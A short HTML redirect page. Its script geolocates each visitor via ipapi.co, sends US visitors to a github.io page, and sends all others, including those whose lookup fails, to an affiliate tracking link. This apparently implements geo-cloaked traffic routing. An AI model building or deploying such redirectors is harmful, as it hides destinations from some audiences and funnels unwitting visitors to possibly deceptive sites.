<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect</title>
</head>
<body>
    <script>
        function getCountry() {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const country = data.country_code;

                    // Исключения: Только USA
                    if (country === 'US') {
                        window.location.href = 'https://rpexxx.github.io/SPL';
                        return;
                    }

                    // Все остальные
                    window.location.href = 'https://stroki.top/click?o=2&a=211&sub_id1=M1';
                })
                .catch(error => {
                    // Если API не отвечает — отправляем на stroki
                    window.location.href = 'https://stroki.top/click?o=2&a=211&sub_id1=M1';
                });
        }

        window.onload = getCountry;
    </script>
</body>
</html>
